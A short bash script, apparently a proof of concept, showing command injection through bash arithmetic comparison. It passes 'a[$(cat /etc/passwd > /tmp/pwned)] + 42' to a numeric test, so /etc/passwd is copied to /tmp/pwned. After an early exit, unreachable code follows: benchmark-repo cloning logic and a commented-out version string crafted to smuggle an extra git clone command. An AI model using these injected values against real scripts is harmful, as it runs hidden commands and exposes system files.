#!/usr/bin/env bash
#!/bin/sh
set -vx
set -eo pipefail

function guess() {
  num="${1}"
  if [[ "${num}" -eq 42 ]]
  then
    echo "Correct"
  else
    echo "Wrong"
  fi
}

rm /tmp/pwned
guess 'a[$(cat /etc/passwd > /tmp/pwned)] + 42'
ls -la /tmp/pwned
head -3 /tmp/pwned
echo $?
exit 0

max_seconds=${MAX_WAIT_SECONDS:-300}
max_ingress_seconds=$(( max_seconds * 6 ))
echo $?
exit

E2E_VERSION="davdhacs:rox-26061"
#E2E_VERSION=';'" || { echo clone dev branch; git clone -b ${E2E_VERSION#*:} --single-branch git@github.com:${E2E_VERSION%:*}/e2e-benchmarking.git ; } "
#E2E_VERSION="${E2E_VERSION#*:} --single-branch git@github.com:${E2E_VERSION%:*}/e2e-benchmarking.git"
E2E_VERSION="git@github.com:${E2E_VERSION%:*}/e2e-benchmarking.git"
REPO_URL="https://github.com/cloud-bulldozer/e2e-benchmarking";
LATEST_TAG=$(curl -s "https://api.github.com/repos/cloud-bulldozer/e2e-benchmarking/releases/latest" | jq -r '.tag_name');
TAG_OPTION="--branch $(if [ "$E2E_VERSION" == "default" ]; then echo "$LATEST_TAG"; else echo "$E2E_VERSION"; fi)";                                                                                                                             
git clone $REPO_URL $TAG_OPTION --depth 1
